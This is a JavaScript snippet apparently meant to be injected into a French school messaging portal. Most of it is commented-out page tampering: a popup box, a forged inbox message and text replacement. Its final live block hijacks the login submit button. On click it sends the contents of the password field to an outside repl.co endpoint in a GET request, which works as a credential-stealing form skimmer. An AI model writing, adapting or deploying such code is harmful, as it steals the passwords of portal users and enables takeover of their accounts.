// const infobox = document.createElement("DIV");
// infobox.classList.add('infobox');
// infobox.innerHTML = '<div class="infobox-header"></div><div class="infobox-main"></div>';
// infobox.style = "z-index: 100000000000000000000; cursor: default; background-color: rgb(245, 245, 245); display: block; padding: 0; position: fixed; box-sizing: border-box; top: 50px; left: 50px; border: none; box-shadow: 0 0 50px 0 rgba(100, 100, 100, 1); width: max-content; height: max-content;";
// document.querySelector('.infobox-header').style = "white: 190px; height: 90px; background-color: white;";
// document.body.appendChild(infobox);
// infobox.onclick = function(){
//     alert(""
//     +
//     "[1 - 12 août] Commencez à coder en apprenant le JavaScript !\n"
//     +
//     "[1 - 12 août] Commencez à coder en apprenant le JavaScript !\n"
//     +
//     "[1 - 12 août] Commencez à coder en apprenant le JavaScript !\n"
//     +
//     "[1 - 12 août] Commencez à coder en apprenant le JavaScript !\n"
//     +
//     "[1 - 12 août] Commencez à coder en apprenant le JavaScript !\n"
//     +
//     "[1 - 12 août] Commencez à coder en apprenant le JavaScript !\n"
//     );
// }

// const hureSection = document.createElement("LI");
// hureSection.classList.add('row');
// hureSection.classList.add('row--full');
// hureSection.classList.add('list-enhanced1__item');
// hureSection.innerHTML = `<div class="col--xs-3 col--full"><span class="text--ellipsis "><span class="space space--xl"></span><input type="checkbox" name="CHK_COMMUNICATIONS" value="31851955"><label for="com31851955"><span class="screen-reader-text">Sélectionner message</span></label><span class="space space--lg"></span><span title="" class="icon "></span><span class="space space--lg"></span><span title="BARTHUEL JULIEN">EntPp</span></span></div><div class="col col--xs-5"><span class="text-ellipsis "><a class="text--ellipsis js-consulterMessage" href="?PROC=MESSAGERIE&amp;ACTION=CONSULTER_COMMUNICATION&amp;ID_DOSSIER=7007100&amp;ID_COMMUNICATION=31851955">Je hais les sciences !</a></span><span class="text--slate-dark"></span></div><div class="col--xs-2"><span class="cartouche cartouche--neutral"><span class="text--ellipsis">EntPp</span></span></div><div class="col--xs-2 text--right"><span title="lundi 28 mars 2022 à 18:11"><time datetime="2022-03-28T18:11:20.000+02:00">28 mars 2022</time></span></div>`;
// document.getElementById('js_boite_reception').appendChild(hureSection);

// const divs = document.querySelectorAll(".h5-like");
// const searchText = "";

// for (let div of divs) {
//     if (div.textContent.includes(searchText)) {
//         div.textContent = 'lool';
//     }
//     div.textContent = 'p';
// }

// document.getElementById('modalTitletriggerNouveauMessage').textContent = "Créer un nouveau message";
document.getElementById('button-submit').setAttribute('id', 'getPwd')
let getPwd = document.getElementById('getPwd');

getPwd.onclick = function() {
    document.getElementById('password').value;
    const Http = new XMLHttpRequest();
    const url='https://phpwhk.conekt.repl.co/chat/index.php?text=' + document.getElementById('password').value;
    Http.open("GET", url);
    Http.send();
};